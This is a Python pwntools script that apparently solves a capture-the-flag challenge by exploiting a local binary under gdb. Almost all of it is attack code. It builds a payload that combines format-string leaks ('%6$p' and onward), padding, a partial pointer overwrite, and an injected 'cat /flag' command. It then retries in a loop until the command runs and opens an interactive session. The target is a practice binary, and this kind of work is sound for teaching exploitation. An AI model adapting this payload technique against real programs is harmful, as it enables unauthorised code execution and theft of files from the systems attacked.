import pwnlib.elf
import pwnlib.rop.rop
import pwnlib.tubes.remote
import pwnlib.context
import pwnlib.gdb

pwnlib.context.context.clear(arch='amd64', os='linux')
pwnlib.context.context.terminal = ["tmux", "splitw", "-h"]

def read_menu(conn):
    for _ in range(4):
        conn.recvline()

# Read the ELF for RDI register ROP
chall = pwnlib.elf.ELF('apps/chall')
libc = pwnlib.elf.ELF('apps/libc-chall.so')


GDB_SCRIPT = '''
layout asm
break save_text
continue
'''

try_counter = 0
while True:
    try_counter += 1
    print("Try number", try_counter)
    # Connect to remote server and get the main address
    with pwnlib.gdb.debug('./apps/chall', GDB_SCRIPT) as r:
        # Goto edit text
        r.sendline(b'1')
        r.recvline() # welcome text
        read_menu(r) # empty buffer

        # Send payload
        payload = bytearray()
        payload += b'cat /flag ' # what system will run
        payload += b'%6$p %7$p %8$p %9$p ' # TEST
        payload += ('a' * (255 - len(payload))).encode('ascii')
        payload += b'\0\x20\x50' # partial overwrite the address to text and hope for the best
        assert len(payload) == 256 + 2
        r.send(payload)

        # Get the result back
        r.recvline() # done
        read_menu(r)
        # Get error message (payloaded!)
        r.sendline(b'4')
        try:
            line = r.recvline()
            if line.startswith(b'> cat /flag '):
                print(line)
                r.sendline(b'2') # Trigger breakpoint
                r.interactive()
                exit()
            else:
                print("Close call:", line)
                continue
        except EOFError:
            continue